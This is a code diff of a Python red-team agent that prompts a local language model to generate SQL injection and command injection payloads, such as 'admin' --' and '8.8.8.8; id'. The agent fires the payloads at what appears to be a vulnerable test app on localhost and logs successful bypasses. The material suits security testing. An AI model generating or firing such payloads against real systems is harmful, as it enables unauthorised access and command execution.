@@ -10,20 +10,17 @@ class RedTeamAgent:
         self.model = model
         self.history_file = "agents/attack_history.json"
         
-        # Наші цілі (Endpoints)
         self.targets = {
             "SQLi": {
                 "url": "http://localhost:5000/login_check",
                 "param": "username",
                 "success_indicator": "Welcome, admin",
-                # Промпт: Кажемо обгорнути в <<< >>>
                 "base_prompt": "You are a hacker. Target: SQLite Login. Goal: Bypass password. Write ONLY the injection payload. Wrap the payload in triple angle brackets like this: <<<admin' -->>>."
             },
             "RCE": {
                 "url": "http://localhost:5000/admin/ping",
                 "param": "ip",
                 "success_indicator": "uid=",
-                # Промпт: Кажемо обгорнути в <<< >>>
                 "base_prompt": "You are a hacker. Target: Python os.popen(). Goal: Execute 'id'. Write ONLY the payload. Wrap the payload in triple angle brackets like this: <<<8.8.8.8; id>>>."
             }
         }
@@ -40,21 +37,18 @@ class RedTeamAgent:
             res = requests.post(self.ollama, json=data).json()
             raw_text = res['response']
             
-            # 🔥 ФІЛЬТР БАЛАЧОК (Regex)
-            # Шукаємо все, що всередині <<< ... >>>
+
             match = re.search(r'<<<(.*?)>>>', raw_text, re.DOTALL)
             
             if match:
                 clean_payload = match.group(1).strip()
                 return clean_payload
             else:
-                # Якщо ШІ затупив і не поставив дужки, пробуємо взяти останній рядок коду
-                # або просто повертаємо як є (але це ризик)
-                print(f"   ⚠️ AI didn't use tags. Raw output: {raw_text[:50]}...")
-                # Спробуємо почистити вручну:
-                clean = raw_text.replace("Here is the payload:", "").replace("Payload:", "").strip()
-                return clean.split('\n')[0] # Беремо тільки перший рядок
 
+                print(f"   ⚠️ AI didn't use tags. Raw output: {raw_text[:50]}...")
+
+                clean = raw_text.replace("Here is the payload:", "").replace("Payload:", "").strip()
+                return clean.split('\n')[0]
         except Exception as e:
             print(f"❌ AI Error: {e}")
             return None
@@ -82,13 +76,11 @@ class RedTeamAgent:
             print(f"   🔸 Attempt {attempt}: Trying payload -> {payload}")
             
             try:
-                # Для SQLi додаємо фіктивний пароль
                 params = {target["param"]: payload}
                 if attack_type == "SQLi": params["password"] = "123"
                 
                 response = requests.get(target["url"], params=params, timeout=5)
                 
-                # Перевірка успіху
                 if target["success_indicator"] in response.text:
                     print(f"   🚩 PWNED! Successful {attack_type}!")
                     self.save_success(attack_type, payload)
